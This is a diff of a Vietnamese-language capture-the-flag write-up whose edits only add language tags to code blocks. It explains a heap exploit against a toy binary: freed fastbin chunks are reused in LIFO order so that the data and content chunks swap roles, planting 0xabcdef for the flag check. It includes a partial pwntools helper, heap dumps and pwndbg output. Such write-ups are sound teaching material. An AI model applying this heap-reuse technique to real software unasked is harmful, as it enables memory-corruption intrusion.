@@ -148,7 +148,7 @@ undefined8 flag_check(void)
 <img width="695" height="447" alt="image" src="https://github.com/user-attachments/assets/4b9b37f5-5382-40d6-9b99-f3e132183f2c" />
 
 * điều kiện để có flag là:
-  ```
+  ```c
   DAT_006020f0 != 0
   DAT_006020f0 + 8 == 0xabcdef
   ```
@@ -156,7 +156,7 @@ undefined8 flag_check(void)
 ___
 ### exploit:
 * chương trình có 2 chức năng chính: `create()` và `delete()`, ta tạo:
-  ```
+  ```python
 	def create(size, data):
 		p.sendlineafter(b">", b"1")
 		p.sendlineafter(b"size:", size)
@@ -178,7 +178,7 @@ ___
 * có chunk `data` mặc định 32 byte (0x20):
   * 0x10 bytes đầu là metadata
   * 0x10 bytes tiếp là chunkdata, và chỉ có 8 bytes đầu là sử dụng để chứa con trỏ (trỏ đến chunk content / trỏ đến freed chunk khác trong bin)
-	```
+	```asm
 	0x182c000:      0x0000000000000000      0x0000000000000021 <== metadata		|
 	0x182c010:      0x000000000182c030      0x0000000000000000 <== chunkdata	| => chunk data
 	0x182c020:      0x0000000000000000      0x0000000000000031	||
@@ -187,17 +187,17 @@ ___
   	```
   * vì vậy, khi `delete` giải phóng chunk, 8 bytes sau hoặc cuối của chunkdata là không bị thay đổi
   * và phần chunkdata của chunk `data` thứ 3 (hay database[2]) này là chỗ `flag_test` kiểm tra điều kiện
-	```
+	```c
 	DAT_006020f0 != 0
 	DAT_006020f0 + 8 == 0xabcdef
 	```
    	hay giả sử theo ví dụ trên:
-    ```
+    ```c
     DAT_006020f0: 		0x182c010
     DAT_006020f0 + 8:	0x182c018
     ``` 
 * nhưng mà khi `create()`, chunk `data` ko write được, có mỗi chunk `content` là writable thông qua:
-  ```
+  ```c
   read(data->content,size);
   ```
   có cách đó là: ta write giá trị yêu cầu của `get_flag()` vào chunk `content` trước, sau đó hoán đổi 2 chunks này (hoán đổi vai trò)
@@ -205,7 +205,7 @@ ___
 * các bước:
   * `create()` chunk lớn thứ 3  
   * tạo size của chunk `content` = size của chunk `data` (= 0x20)
-    ```
+    ```asm
     ...
 	0x182c090       0x0000000000000000      0x0000000000000021      ........!.......
 	0x182c0a0       0x0000000000000000      0x0000000000000000      ................
@@ -214,7 +214,7 @@ ___
 	0x182c0d0       0x0000000000000000      0x0000000000020f31      ........1.......         <-- Top chunk
     ```
     điền giá trị yêu cầu của `get_flag()` trước vào chunk `content`:
-    ```
+    ```asm
     ...
 	0x182c090       0x0000000000000000      0x0000000000000021      ........!.......
 	0x182c0a0       0x000000000182c0c0      0x0000000000000000      ................
@@ -229,7 +229,7 @@ ___
 
 	![heap5](images/heap1/heap5.png)
 
-	```
+	```asm
 	0x182c090       0x0000000000000000      0x0000000000000021      ........!.......         <-- fastbins[0x20][1]
 	0x182c0a0       0x0000000000000000      0x0000000000000000      ................
 	0x182c0b0       0x0000000000000000      0x0000000000000021      ........!.......         <-- fastbins[0x20][0]
@@ -240,20 +240,20 @@ ___
 
 	![heap6](images/heap1/heap6.png)
 	
-	```
+	```c
 	pwndbg> fastbins
 	fastbins
 	0x20: 0x182c0b0 —▸ 0x182c090 ◂— 0
   	```
 	đúng theo thứ tự `free()`: chunk `data` vào bin trước, sau đó chunk `content` vào bin trỏ đến chunk `data` 
-	```
+	```c
       ptr = (&database)[index]->content;
       free((&database)[index]);
       free(ptr);
   	```
   * bug bắt đầu ở đây, thuật toán heap bins theo là **LIFO (Last in First out)**: nghĩa là chunk cuối cùng được freed là chunk đầu tiên được tái sử dụng nếu có lệnh malloc() (cùng size)
     khi gọi lại `create()`:
-    ```
+    ```c
     data = (data *)malloc(0x10);
     content = (char *)malloc((ulong)size);
     ```
@@ -270,16 +270,16 @@ ___
 	![heap10](images/heap1/heap10.png)
 
   * Khi chọn option 4 để `get_flag` kiểm tra điều kiện tại `database[2]`, khi đấy là:
-    ```
+    ```asm
 	0x182c090       0x0000000000000000      0x0000000000000021      ........!.......	||
 	0x182c0a0       0x4444444444444444      0x0000000000000000      DDDDDDDD........	|| => chunk `content`
 	0x182c0b0       0x0000000000000000      0x0000000000000021      ........!....... => metadata	|
 	0x182c0c0       0x000000000182c0a0      0x0000000000abcdef      ................ => chunkdata 	| => chunk `data`
     ```
-	```
+	```c
 	database[2]: 0x182c0c0 (pointer trỏ đến data thứ 3) 
   	```
-  	```
+  	```c
 	0x182c0c0 != 0
 	0x182c0c8 == 0xabcdef
 	```
